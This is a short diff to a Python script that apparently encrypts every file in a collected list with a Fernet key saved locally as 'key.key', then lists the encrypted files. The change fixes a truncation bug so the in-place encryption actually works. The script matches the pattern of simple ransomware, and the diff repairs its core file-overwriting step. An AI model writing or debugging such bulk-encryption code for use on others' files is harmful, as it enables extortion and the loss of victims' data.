@@ -36,9 +36,10 @@ with open("key.key", "wb") as keyfile:
     keyfile.write(key)
 
 for file in all_files:
-    with open(file, "wb+") as raw_file:
+    with open(file, "rb") as raw_file:
         contents = raw_file.read()
-        enc_contents = Fernet(key).encrypt(contents)
+    enc_contents = Fernet(key).encrypt(contents)
+    with open(file, "wb") as raw_file:
         raw_file.write(enc_contents)
 
 print("Files that have been encrypted are:")
